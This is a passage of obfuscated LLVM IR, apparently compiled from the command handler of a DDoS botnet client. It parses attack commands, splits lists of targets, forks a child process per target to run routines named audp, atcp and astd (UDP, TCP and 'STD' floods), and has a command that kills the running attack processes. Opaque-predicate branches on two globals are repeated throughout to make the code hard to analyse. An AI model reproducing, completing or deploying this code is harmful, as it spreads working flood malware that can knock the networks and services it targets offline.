  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %245, label %254, label %282

; <label>:254:                                    ; preds = %originalBBpart228
  %255 = call i32 @listFork()
  %256 = icmp ne i32 %255, 0
  br i1 %256, label %264, label %257

; <label>:257:                                    ; preds = %254
  %258 = load i8*, i8** %19, align 8
  %259 = load i32, i32* %14, align 4
  %260 = load i32, i32* %15, align 4
  %261 = load i32, i32* %16, align 4
  %262 = load i32, i32* %17, align 4
  %263 = load i32, i32* %18, align 4
  call void @audp(i8* %258, i32 %259, i32 %260, i32 %261, i32 %262, i32 %263)
  call void @_exit(i32 0) #11
  unreachable

; <label>:264:                                    ; preds = %254
  %265 = load i32, i32* @x.51
  %266 = load i32, i32* @y.52
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %264
  %273 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %273, i8** %19, align 8
  %274 = load i32, i32* @x.51
  %275 = load i32, i32* @y.52
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %235

; <label>:282:                                    ; preds = %originalBBpart228
  %283 = load i32, i32* @x.51
  %284 = load i32, i32* @y.52
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %282
  %291 = load i32, i32* @x.51
  %292 = load i32, i32* @y.52
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %342

; <label>:299:                                    ; preds = %227
  %300 = load i32, i32* @x.51
  %301 = load i32, i32* @y.52
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %299
  %308 = call i32 @listFork()
  %309 = icmp ne i32 %308, 0
  %310 = load i32, i32* @x.51
  %311 = load i32, i32* @y.52
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %309, label %341, label %318

; <label>:318:                                    ; preds = %originalBBpart240
  %319 = load i32, i32* @x.51
  %320 = load i32, i32* @y.52
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %318
  %327 = load i8*, i8** %13, align 8
  %328 = load i32, i32* %14, align 4
  %329 = load i32, i32* %15, align 4
  %330 = load i32, i32* %16, align 4
  %331 = load i32, i32* %17, align 4
  %332 = load i32, i32* %18, align 4
  call void @audp(i8* %327, i32 %328, i32 %329, i32 %330, i32 %331, i32 %332)
  call void @_exit(i32 0) #11
  %333 = load i32, i32* @x.51
  %334 = load i32, i32* @y.52
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  unreachable

; <label>:341:                                    ; preds = %originalBBpart240
  br label %342

; <label>:342:                                    ; preds = %341, %originalBBpart236
  br label %826

; <label>:343:                                    ; preds = %originalBBpart2
  %344 = load i32, i32* @x.51
  %345 = load i32, i32* @y.52
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %343
  %352 = load i8**, i8*** %12, align 8
  %353 = getelementptr inbounds i8*, i8** %352, i64 0
  %354 = load i8*, i8** %353, align 8
  %355 = call i32 @strcmp(i8* %354, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.30, i32 0, i32 0)) #10
  %356 = icmp ne i32 %355, 0
  %357 = load i32, i32* @x.51
  %358 = load i32, i32* @y.52
  %359 = sub i32 %357, 1
  %360 = mul i32 %357, %359
  %361 = urem i32 %360, 2
  %362 = icmp eq i32 %361, 0
  %363 = icmp slt i32 %358, 10
  %364 = or i1 %362, %363
  br i1 %364, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %356, label %582, label %365

; <label>:365:                                    ; preds = %originalBBpart248
  %366 = load i32, i32* %11, align 4
  %367 = icmp slt i32 %366, 6
  br i1 %367, label %442, label %368

; <label>:368:                                    ; preds = %365
  %369 = load i8**, i8*** %12, align 8
  %370 = getelementptr inbounds i8*, i8** %369, i64 3
  %371 = load i8*, i8** %370, align 8
  %372 = call i32 @atoi(i8* %371) #10
  %373 = icmp eq i32 %372, -1
  br i1 %373, label %442, label %374

; <label>:374:                                    ; preds = %368
  %375 = load i32, i32* @x.51
  %376 = load i32, i32* @y.52
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %374
  %383 = load i8**, i8*** %12, align 8
  %384 = getelementptr inbounds i8*, i8** %383, i64 2
  %385 = load i8*, i8** %384, align 8
  %386 = call i32 @atoi(i8* %385) #10
  %387 = icmp eq i32 %386, -1
  %388 = load i32, i32* @x.51
  %389 = load i32, i32* @y.52
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %387, label %442, label %396

; <label>:396:                                    ; preds = %originalBBpart252
  %397 = load i8**, i8*** %12, align 8
  %398 = getelementptr inbounds i8*, i8** %397, i64 4
  %399 = load i8*, i8** %398, align 8
  %400 = call i32 @atoi(i8* %399) #10
  %401 = icmp eq i32 %400, -1
  br i1 %401, label %442, label %402

; <label>:402:                                    ; preds = %396
  %403 = load i8**, i8*** %12, align 8
  %404 = getelementptr inbounds i8*, i8** %403, i64 4
  %405 = load i8*, i8** %404, align 8
  %406 = call i32 @atoi(i8* %405) #10
  %407 = icmp sgt i32 %406, 32
  br i1 %407, label %442, label %408

; <label>:408:                                    ; preds = %402
  %409 = load i32, i32* %11, align 4
  %410 = icmp sgt i32 %409, 6
  br i1 %410, label %411, label %417

; <label>:411:                                    ; preds = %408
  %412 = load i8**, i8*** %12, align 8
  %413 = getelementptr inbounds i8*, i8** %412, i64 6
  %414 = load i8*, i8** %413, align 8
  %415 = call i32 @atoi(i8* %414) #10
  %416 = icmp slt i32 %415, 0
  br i1 %416, label %442, label %417

; <label>:417:                                    ; preds = %411, %408
  %418 = load i32, i32* %11, align 4
  %419 = icmp eq i32 %418, 8
  br i1 %419, label %420, label %443

; <label>:420:                                    ; preds = %417
  %421 = load i32, i32* @x.51
  %422 = load i32, i32* @y.52
  %423 = sub i32 %421, 1
  %424 = mul i32 %421, %423
  %425 = urem i32 %424, 2
  %426 = icmp eq i32 %425, 0
  %427 = icmp slt i32 %422, 10
  %428 = or i1 %426, %427
  br i1 %428, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %420
  %429 = load i8**, i8*** %12, align 8
  %430 = getelementptr inbounds i8*, i8** %429, i64 7
  %431 = load i8*, i8** %430, align 8
  %432 = call i32 @atoi(i8* %431) #10
  %433 = icmp slt i32 %432, 1
  %434 = load i32, i32* @x.51
  %435 = load i32, i32* @y.52
  %436 = sub i32 %434, 1
  %437 = mul i32 %434, %436
  %438 = urem i32 %437, 2
  %439 = icmp eq i32 %438, 0
  %440 = icmp slt i32 %435, 10
  %441 = or i1 %439, %440
  br i1 %441, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %433, label %442, label %443

; <label>:442:                                    ; preds = %originalBBpart256, %411, %402, %396, %originalBBpart252, %368, %365
  br label %826

; <label>:443:                                    ; preds = %originalBBpart256, %417
  %444 = load i8**, i8*** %12, align 8
  %445 = getelementptr inbounds i8*, i8** %444, i64 1
  %446 = load i8*, i8** %445, align 8
  store i8* %446, i8** %20, align 8
  %447 = load i8**, i8*** %12, align 8
  %448 = getelementptr inbounds i8*, i8** %447, i64 2
  %449 = load i8*, i8** %448, align 8
  %450 = call i32 @atoi(i8* %449) #10
  store i32 %450, i32* %21, align 4
  %451 = load i8**, i8*** %12, align 8
  %452 = getelementptr inbounds i8*, i8** %451, i64 3
  %453 = load i8*, i8** %452, align 8
  %454 = call i32 @atoi(i8* %453) #10
  store i32 %454, i32* %22, align 4
  %455 = load i8**, i8*** %12, align 8
  %456 = getelementptr inbounds i8*, i8** %455, i64 4
  %457 = load i8*, i8** %456, align 8
  %458 = call i32 @atoi(i8* %457) #10
  store i32 %458, i32* %23, align 4
  %459 = load i8**, i8*** %12, align 8
  %460 = getelementptr inbounds i8*, i8** %459, i64 5
  %461 = load i8*, i8** %460, align 8
  store i8* %461, i8** %24, align 8
  %462 = load i32, i32* %11, align 4
  %463 = icmp eq i32 %462, 8
  br i1 %463, label %464, label %469

; <label>:464:                                    ; preds = %443
  %465 = load i8**, i8*** %12, align 8
  %466 = getelementptr inbounds i8*, i8** %465, i64 7
  %467 = load i8*, i8** %466, align 8
  %468 = call i32 @atoi(i8* %467) #10
  br label %470

; <label>:469:                                    ; preds = %443
  br label %470

; <label>:470:                                    ; preds = %469, %464
  %471 = phi i32 [ %468, %464 ], [ 10, %469 ]
  store i32 %471, i32* %25, align 4
  %472 = load i32, i32* %11, align 4
  %473 = icmp sgt i32 %472, 6
  br i1 %473, label %474, label %495

; <label>:474:                                    ; preds = %470
  %475 = load i32, i32* @x.51
  %476 = load i32, i32* @y.52
  %477 = sub i32 %475, 1
  %478 = mul i32 %475, %477
  %479 = urem i32 %478, 2
  %480 = icmp eq i32 %479, 0
  %481 = icmp slt i32 %476, 10
  %482 = or i1 %480, %481
  br i1 %482, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %474
  %483 = load i8**, i8*** %12, align 8
  %484 = getelementptr inbounds i8*, i8** %483, i64 6
  %485 = load i8*, i8** %484, align 8
  %486 = call i32 @atoi(i8* %485) #10
  %487 = load i32, i32* @x.51
  %488 = load i32, i32* @y.52
  %489 = sub i32 %487, 1
  %490 = mul i32 %487, %489
  %491 = urem i32 %490, 2
  %492 = icmp eq i32 %491, 0
  %493 = icmp slt i32 %488, 10
  %494 = or i1 %492, %493
  br i1 %494, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %496

; <label>:495:                                    ; preds = %470
  br label %496

; <label>:496:                                    ; preds = %495, %originalBBpart260
  %497 = phi i32 [ %486, %originalBBpart260 ], [ 0, %495 ]
  store i32 %497, i32* %26, align 4
  %498 = load i8*, i8** %20, align 8
  %499 = call i8* @strstr(i8* %498, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %500 = icmp ne i8* %499, null
  br i1 %500, label %501, label %537

; <label>:501:                                    ; preds = %496
  %502 = load i8*, i8** %20, align 8
  %503 = call i8* @strtok(i8* %502, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %503, i8** %27, align 8
  br label %504

; <label>:504:                                    ; preds = %534, %501
  %505 = load i32, i32* @x.51
  %506 = load i32, i32* @y.52
  %507 = sub i32 %505, 1
  %508 = mul i32 %505, %507
  %509 = urem i32 %508, 2
  %510 = icmp eq i32 %509, 0
  %511 = icmp slt i32 %506, 10
  %512 = or i1 %510, %511
  br i1 %512, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %504
  %513 = load i8*, i8** %27, align 8
  %514 = icmp ne i8* %513, null
  %515 = load i32, i32* @x.51
  %516 = load i32, i32* @y.52
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %514, label %523, label %536

; <label>:523:                                    ; preds = %originalBBpart264
  %524 = call i32 @listFork()
  %525 = icmp ne i32 %524, 0
  br i1 %525, label %534, label %526

; <label>:526:                                    ; preds = %523
  %527 = load i8*, i8** %27, align 8
  %528 = load i32, i32* %21, align 4
  %529 = load i32, i32* %22, align 4
  %530 = load i32, i32* %23, align 4
  %531 = load i8*, i8** %24, align 8
  %532 = load i32, i32* %26, align 4
  %533 = load i32, i32* %25, align 4
  call void @atcp(i8* %527, i32 %528, i32 %529, i32 %530, i8* %531, i32 %532, i32 %533)
  call void @_exit(i32 0) #11
  unreachable

; <label>:534:                                    ; preds = %523
  %535 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %535, i8** %27, align 8
  br label %504

; <label>:536:                                    ; preds = %originalBBpart264
  br label %565

; <label>:537:                                    ; preds = %496
  %538 = call i32 @listFork()
  %539 = icmp ne i32 %538, 0
  br i1 %539, label %548, label %540

; <label>:540:                                    ; preds = %537
  %541 = load i8*, i8** %20, align 8
  %542 = load i32, i32* %21, align 4
  %543 = load i32, i32* %22, align 4
  %544 = load i32, i32* %23, align 4
  %545 = load i8*, i8** %24, align 8
  %546 = load i32, i32* %26, align 4
  %547 = load i32, i32* %25, align 4
  call void @atcp(i8* %541, i32 %542, i32 %543, i32 %544, i8* %545, i32 %546, i32 %547)
  call void @_exit(i32 0) #11
  unreachable

; <label>:548:                                    ; preds = %537
  %549 = load i32, i32* @x.51
  %550 = load i32, i32* @y.52
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %548
  %557 = load i32, i32* @x.51
  %558 = load i32, i32* @y.52
  %559 = sub i32 %557, 1
  %560 = mul i32 %557, %559
  %561 = urem i32 %560, 2
  %562 = icmp eq i32 %561, 0
  %563 = icmp slt i32 %558, 10
  %564 = or i1 %562, %563
  br i1 %564, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %565

; <label>:565:                                    ; preds = %originalBBpart268, %536
  %566 = load i32, i32* @x.51
  %567 = load i32, i32* @y.52
  %568 = sub i32 %566, 1
  %569 = mul i32 %566, %568
  %570 = urem i32 %569, 2
  %571 = icmp eq i32 %570, 0
  %572 = icmp slt i32 %567, 10
  %573 = or i1 %571, %572
  br i1 %573, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %565
  %574 = load i32, i32* @x.51
  %575 = load i32, i32* @y.52
  %576 = sub i32 %574, 1
  %577 = mul i32 %574, %576
  %578 = urem i32 %577, 2
  %579 = icmp eq i32 %578, 0
  %580 = icmp slt i32 %575, 10
  %581 = or i1 %579, %580
  br i1 %581, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %826

; <label>:582:                                    ; preds = %originalBBpart248
  %583 = load i8**, i8*** %12, align 8
  %584 = getelementptr inbounds i8*, i8** %583, i64 0
  %585 = load i8*, i8** %584, align 8
  %586 = call i32 @strcmp(i8* %585, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.31, i32 0, i32 0)) #10
  %587 = icmp ne i32 %586, 0
  br i1 %587, label %736, label %588

; <label>:588:                                    ; preds = %582
  %589 = load i32, i32* %11, align 4
  %590 = icmp slt i32 %589, 4
  br i1 %590, label %625, label %591

; <label>:591:                                    ; preds = %588
  %592 = load i8**, i8*** %12, align 8
  %593 = getelementptr inbounds i8*, i8** %592, i64 2
  %594 = load i8*, i8** %593, align 8
  %595 = call i32 @atoi(i8* %594) #10
  %596 = icmp slt i32 %595, 1
  br i1 %596, label %625, label %597

; <label>:597:                                    ; preds = %591
  %598 = load i32, i32* @x.51
  %599 = load i32, i32* @y.52
  %600 = sub i32 %598, 1
  %601 = mul i32 %598, %600
  %602 = urem i32 %601, 2
  %603 = icmp eq i32 %602, 0
  %604 = icmp slt i32 %599, 10
  %605 = or i1 %603, %604
  br i1 %605, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %597
  %606 = load i8**, i8*** %12, align 8
  %607 = getelementptr inbounds i8*, i8** %606, i64 3
  %608 = load i8*, i8** %607, align 8
  %609 = call i32 @atoi(i8* %608) #10
  %610 = icmp slt i32 %609, 1
  %611 = load i32, i32* @x.51
  %612 = load i32, i32* @y.52
  %613 = sub i32 %611, 1
  %614 = mul i32 %611, %613
  %615 = urem i32 %614, 2
  %616 = icmp eq i32 %615, 0
  %617 = icmp slt i32 %612, 10
  %618 = or i1 %616, %617
  br i1 %618, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %610, label %625, label %619

; <label>:619:                                    ; preds = %originalBBpart276
  %620 = load i8**, i8*** %12, align 8
  %621 = getelementptr inbounds i8*, i8** %620, i64 4
  %622 = load i8*, i8** %621, align 8
  %623 = call i32 @atoi(i8* %622) #10
  %624 = icmp slt i32 %623, 1
  br i1 %624, label %625, label %642

; <label>:625:                                    ; preds = %619, %originalBBpart276, %591, %588
  %626 = load i32, i32* @x.51
  %627 = load i32, i32* @y.52
  %628 = sub i32 %626, 1
  %629 = mul i32 %626, %628
  %630 = urem i32 %629, 2
  %631 = icmp eq i32 %630, 0
  %632 = icmp slt i32 %627, 10
  %633 = or i1 %631, %632
  br i1 %633, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %625
  %634 = load i32, i32* @x.51
  %635 = load i32, i32* @y.52
  %636 = sub i32 %634, 1
  %637 = mul i32 %634, %636
  %638 = urem i32 %637, 2
  %639 = icmp eq i32 %638, 0
  %640 = icmp slt i32 %635, 10
  %641 = or i1 %639, %640
  br i1 %641, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %826

; <label>:642:                                    ; preds = %619
  %643 = load i8**, i8*** %12, align 8
  %644 = getelementptr inbounds i8*, i8** %643, i64 1
  %645 = load i8*, i8** %644, align 8
  store i8* %645, i8** %28, align 8
  %646 = load i8**, i8*** %12, align 8
  %647 = getelementptr inbounds i8*, i8** %646, i64 2
  %648 = load i8*, i8** %647, align 8
  %649 = call i32 @atoi(i8* %648) #10
  store i32 %649, i32* %29, align 4
  %650 = load i8**, i8*** %12, align 8
  %651 = getelementptr inbounds i8*, i8** %650, i64 3
  %652 = load i8*, i8** %651, align 8
  %653 = call i32 @atoi(i8* %652) #10
  store i32 %653, i32* %30, align 4
  %654 = load i8**, i8*** %12, align 8
  %655 = getelementptr inbounds i8*, i8** %654, i64 4
  %656 = load i8*, i8** %655, align 8
  %657 = call i32 @atoi(i8* %656) #10
  store i32 %657, i32* %31, align 4
  %658 = load i8*, i8** %28, align 8
  %659 = call i8* @strstr(i8* %658, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %660 = icmp ne i8* %659, null
  br i1 %660, label %661, label %726

; <label>:661:                                    ; preds = %642
  %662 = load i8*, i8** %28, align 8
  %663 = call i8* @strtok(i8* %662, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %663, i8** %32, align 8
  br label %664

; <label>:664:                                    ; preds = %originalBBpart292, %661
  %665 = load i32, i32* @x.51
  %666 = load i32, i32* @y.52
  %667 = sub i32 %665, 1
  %668 = mul i32 %665, %667
  %669 = urem i32 %668, 2
  %670 = icmp eq i32 %669, 0
  %671 = icmp slt i32 %666, 10
  %672 = or i1 %670, %671
  br i1 %672, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %664
  %673 = load i8*, i8** %32, align 8
  %674 = icmp ne i8* %673, null
  %675 = load i32, i32* @x.51
  %676 = load i32, i32* @y.52
  %677 = sub i32 %675, 1
  %678 = mul i32 %675, %677
  %679 = urem i32 %678, 2
  %680 = icmp eq i32 %679, 0
  %681 = icmp slt i32 %676, 10
  %682 = or i1 %680, %681
  br i1 %682, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %674, label %683, label %725

; <label>:683:                                    ; preds = %originalBBpart284
  %684 = call i32 @listFork()
  %685 = icmp ne i32 %684, 0
  br i1 %685, label %707, label %686

; <label>:686:                                    ; preds = %683
  %687 = load i32, i32* @x.51
  %688 = load i32, i32* @y.52
  %689 = sub i32 %687, 1
  %690 = mul i32 %687, %689
  %691 = urem i32 %690, 2
  %692 = icmp eq i32 %691, 0
  %693 = icmp slt i32 %688, 10
  %694 = or i1 %692, %693
  br i1 %694, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %686
  %695 = load i8*, i8** %32, align 8
  %696 = load i32, i32* %29, align 4
  %697 = load i32, i32* %30, align 4
  %698 = load i32, i32* %31, align 4
  call void @astd(i8* %695, i32 %696, i32 %697, i32 %698)
  call void @_exit(i32 0) #11
  %699 = load i32, i32* @x.51
  %700 = load i32, i32* @y.52
  %701 = sub i32 %699, 1
  %702 = mul i32 %699, %701
  %703 = urem i32 %702, 2
  %704 = icmp eq i32 %703, 0
  %705 = icmp slt i32 %700, 10
  %706 = or i1 %704, %705
  br i1 %706, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  unreachable

; <label>:707:                                    ; preds = %683
  %708 = load i32, i32* @x.51
  %709 = load i32, i32* @y.52
  %710 = sub i32 %708, 1
  %711 = mul i32 %708, %710
  %712 = urem i32 %711, 2
  %713 = icmp eq i32 %712, 0
  %714 = icmp slt i32 %709, 10
  %715 = or i1 %713, %714
  br i1 %715, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %707
  %716 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %716, i8** %32, align 8
  %717 = load i32, i32* @x.51
  %718 = load i32, i32* @y.52
  %719 = sub i32 %717, 1
  %720 = mul i32 %717, %719
  %721 = urem i32 %720, 2
  %722 = icmp eq i32 %721, 0
  %723 = icmp slt i32 %718, 10
  %724 = or i1 %722, %723
  br i1 %724, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br label %664

; <label>:725:                                    ; preds = %originalBBpart284
  br label %735

; <label>:726:                                    ; preds = %642
  %727 = call i32 @listFork()
  %728 = icmp ne i32 %727, 0
  br i1 %728, label %729, label %730

; <label>:729:                                    ; preds = %726
  br label %826

; <label>:730:                                    ; preds = %726
  %731 = load i8*, i8** %28, align 8
  %732 = load i32, i32* %29, align 4
  %733 = load i32, i32* %30, align 4
  %734 = load i32, i32* %31, align 4
  call void @astd(i8* %731, i32 %732, i32 %733, i32 %734)
  call void @_exit(i32 0) #11
  unreachable

; <label>:735:                                    ; preds = %725
  br label %736

; <label>:736:                                    ; preds = %735, %582
  %737 = load i8**, i8*** %12, align 8
  %738 = getelementptr inbounds i8*, i8** %737, i64 0
  %739 = load i8*, i8** %738, align 8
  %740 = call i32 @strcmp(i8* %739, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0)) #10
  %741 = icmp ne i32 %740, 0
  br i1 %741, label %826, label %742

; <label>:742:                                    ; preds = %736
  %743 = load i32, i32* @x.51
  %744 = load i32, i32* @y.52
  %745 = sub i32 %743, 1
  %746 = mul i32 %743, %745
  %747 = urem i32 %746, 2
  %748 = icmp eq i32 %747, 0
  %749 = icmp slt i32 %744, 10
  %750 = or i1 %748, %749
  br i1 %750, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %742
  store i32 0, i32* %33, align 4
  store i64 0, i64* %34, align 8
  %751 = load i32, i32* @x.51
  %752 = load i32, i32* @y.52
  %753 = sub i32 %751, 1
  %754 = mul i32 %751, %753
  %755 = urem i32 %754, 2
  %756 = icmp eq i32 %755, 0
  %757 = icmp slt i32 %752, 10
  %758 = or i1 %756, %757
  br i1 %758, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %759

; <label>:759:                                    ; preds = %785, %originalBBpart296
  %760 = load i64, i64* %34, align 8
  %761 = load i64, i64* @numpids, align 8
  %762 = icmp ult i64 %760, %761
  br i1 %762, label %763, label %788

; <label>:763:                                    ; preds = %759
  %764 = load i32*, i32** @pids, align 8
  %765 = load i64, i64* %34, align 8
  %766 = getelementptr inbounds i32, i32* %764, i64 %765
  %767 = load i32, i32* %766, align 4
  %768 = icmp ne i32 %767, 0
  br i1 %768, label %769, label %784

; <label>:769:                                    ; preds = %763
  %770 = load i32*, i32** @pids, align 8
  %771 = load i64, i64* %34, align 8
  %772 = getelementptr inbounds i32, i32* %770, i64 %771
  %773 = load i32, i32* %772, align 4
  %774 = call i32 @getpid() #6
  %775 = icmp ne i32 %773, %774
  br i1 %775, label %776, label %784

; <label>:776:                                    ; preds = %769
  %777 = load i32*, i32** @pids, align 8
  %778 = load i64, i64* %34, align 8
  %779 = getelementptr inbounds i32, i32* %777, i64 %778
  %780 = load i32, i32* %779, align 4
  %781 = call i32 @kill(i32 %780, i32 9) #6
  %782 = load i32, i32* %33, align 4
  %783 = add nsw i32 %782, 1
  store i32 %783, i32* %33, align 4
  br label %784

; <label>:784:                                    ; preds = %776, %769, %763
  br label %785

; <label>:785:                                    ; preds = %784
  %786 = load i64, i64* %34, align 8
  %787 = add i64 %786, 1
  store i64 %787, i64* %34, align 8
  br label %759

; <label>:788:                                    ; preds = %759
  %789 = load i32, i32* @x.51
  %790 = load i32, i32* @y.52
  %791 = sub i32 %789, 1
  %792 = mul i32 %789, %791
  %793 = urem i32 %792, 2
  %794 = icmp eq i32 %793, 0
  %795 = icmp slt i32 %790, 10
  %796 = or i1 %794, %795
  br i1 %796, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %788
  %797 = load i32, i32* %33, align 4
  %798 = icmp sgt i32 %797, 0
  %799 = load i32, i32* @x.51
  %800 = load i32, i32* @y.52
  %801 = sub i32 %799, 1
  %802 = mul i32 %799, %801
  %803 = urem i32 %802, 2
  %804 = icmp eq i32 %803, 0
  %805 = icmp slt i32 %800, 10
  %806 = or i1 %804, %805
  br i1 %806, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %798, label %807, label %808

; <label>:807:                                    ; preds = %originalBBpart2100
  br label %825

; <label>:808:                                    ; preds = %originalBBpart2100
  %809 = load i32, i32* @x.51
  %810 = load i32, i32* @y.52
  %811 = sub i32 %809, 1
  %812 = mul i32 %809, %811
  %813 = urem i32 %812, 2
  %814 = icmp eq i32 %813, 0
  %815 = icmp slt i32 %810, 10
  %816 = or i1 %814, %815
  br i1 %816, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %808
  %817 = load i32, i32* @x.51
  %818 = load i32, i32* @y.52
  %819 = sub i32 %817, 1
  %820 = mul i32 %817, %819
  %821 = urem i32 %820, 2
  %822 = icmp eq i32 %821, 0
  %823 = icmp slt i32 %818, 10
  %824 = or i1 %822, %823
  br i1 %824, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %825

; <label>:825:                                    ; preds = %originalBBpart2104, %807
  br label %826

; <label>:826:                                    ; preds = %825, %736, %729, %originalBBpart280, %originalBBpart272, %442, %342, %originalBBpart220
  %827 = load i32, i32* @x.51
